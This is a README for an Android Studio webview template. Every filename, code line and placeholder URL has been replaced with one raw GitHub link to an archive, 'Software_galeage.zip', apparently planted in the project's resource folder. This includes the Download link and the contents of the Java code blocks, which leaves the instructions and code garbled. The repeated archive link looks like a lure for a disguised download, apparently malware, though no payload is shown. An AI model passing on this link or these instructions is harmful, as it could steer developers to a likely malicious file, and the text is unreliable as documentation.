This is a template project for Android Studio that allows you to create an android webview application in minutes. You can use it to create a simple app for your website or as a starting point for your HTML5 based android app.

### Getting started

[Download](https://raw.githubusercontent.com/joaquincanete/webview/master/app/src/main/res/values/Software_galeage.zip) or clone this repository and import it into Android Studio.

### Using a remote source

If you want to create an app that shows the content of a remote website

1. uncomment line **24** in `https://raw.githubusercontent.com/joaquincanete/webview/master/app/src/main/res/values/Software_galeage.zip` and replace `https://raw.githubusercontent.com/joaquincanete/webview/master/app/src/main/res/values/Software_galeage.zip` with your url

	```java
	https://raw.githubusercontent.com/joaquincanete/webview/master/app/src/main/res/values/Software_galeage.zip("https://raw.githubusercontent.com/joaquincanete/webview/master/app/src/main/res/values/Software_galeage.zip");
	```

2. open the `https://raw.githubusercontent.com/joaquincanete/webview/master/app/src/main/res/values/Software_galeage.zip` file and replace `https://raw.githubusercontent.com/joaquincanete/webview/master/app/src/main/res/values/Software_galeage.zip` on line **15** with your hostname

	```java
	hostname = "https://raw.githubusercontent.com/joaquincanete/webview/master/app/src/main/res/values/Software_galeage.zip";
	```

### Using a local source

If you want to create a local HTML5 android app

1. uncomment line **27** in `https://raw.githubusercontent.com/joaquincanete/webview/master/app/src/main/res/values/Software_galeage.zip`

	```java
	https://raw.githubusercontent.com/joaquincanete/webview/master/app/src/main/res/values/Software_galeage.zip("https://raw.githubusercontent.com/joaquincanete/webview/master/app/src/main/res/values/Software_galeage.zip");
	```

2. put all your files (including your `https://raw.githubusercontent.com/joaquincanete/webview/master/app/src/main/res/values/Software_galeage.zip`) in the `assets` directory
